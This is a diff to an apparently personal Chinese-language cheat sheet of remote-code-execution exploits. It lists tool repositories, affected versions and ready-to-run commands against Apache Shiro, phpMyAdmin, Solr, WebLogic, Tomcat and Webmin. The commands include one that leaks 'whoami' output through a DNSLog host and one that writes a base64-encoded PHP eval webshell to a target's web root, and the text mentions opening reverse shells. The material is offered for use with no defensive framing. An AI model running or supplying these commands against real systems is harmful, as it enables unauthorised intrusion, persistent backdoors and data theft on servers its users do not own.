@@ -2,6 +2,8 @@
 http://k8gege.org/p/ab3e87f7.html
 https://pan.baidu.com/s/1cpcQeE (需要登入百度網盤)
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Apache Shiro
 https://github.com/sv3nbeast/ShiroScan
 https://github.com/fupinglee/ShiroScan (GUI圖形化，比較好用)
@@ -12,6 +14,8 @@ use :
 利用 DNSLog 去接收是否資訊(不回顯)
 python shiro_rce.py http://targetip:port/login "ping `whoami`.ssngky.dnslog.cn"
 或利用圖形化 GUI 界面進行反彈 Shell。
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # phpmyadmin(CVE-2016-5734)
 https://www.exploit-db.com/exploits/40185
@@ -25,12 +29,16 @@ python3 CVE-2016-5734.py -u root -p root -d test http://targetip:port/ -c "syste
 Getshell(Payload是base64encode，寫一句話到根目錄下):
 python3  CVE-2016-5734.py -u root -p root http://targetip:port/ -c "file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4='));"
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Apache Solr
 https://github.com/c1aysec/Apache-Solr-RCE
 影響範圍 : 
 Apache Solr < 8.2.0
 use : 
 python2 http://targetip:port/ whoami
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Weblogic 
 (1)https://github.com/wsfengfan/cve-2020-14882
@@ -75,9 +83,30 @@ cmd >> whoami (直接回顯在terminal)
 use :
 python2 weblogic_wls_wsat_exp.py -t 192.168.235.128:7001 -c "command"
 
-# ATomcat
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Tomcat
 https://github.com/1337g/CVE-2017-12615
 影響範圍 :
 Apache Tomcat 7.0.0 - 7.0.79
 use :
 python2 CVE-2017-12615.py http://targetip:port
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Webadmin
+(1) https://github.com/jas502n/CVE-2019-15107
+影響範圍 :
+Webmin <=1.920
+use :
+python2 CVE_2019_15107.py https://192.168.109.128:10000 id
+
+(2)https://github.com/p0dalirius/CVE-2022-36446-Webmin-Software-Package-Updates-RCE (須知道後台帳戶)
+影響範圍 :
+Webmin < 1.997
+use :
+python3 CVE-2022-36446.py -t https://192.168.109.128:10000/ -u root -p root -k -I
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
